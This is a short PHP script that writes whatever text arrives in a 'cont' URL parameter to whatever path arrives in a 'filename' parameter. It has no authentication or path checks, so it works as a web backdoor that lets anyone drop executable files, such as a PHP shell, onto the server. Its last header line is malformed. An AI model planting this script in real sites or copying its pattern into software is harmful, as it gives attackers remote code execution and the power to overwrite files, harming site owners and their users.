<?php
$filename = $_GET['filename'];
if (!isset($filename)) header("Location:26.php");
$cont = $_GET['cont'];
$fp = fopen($filename,'w+');
fwrite($fp,$cont);
fclose($fp);
header("{$filename}");
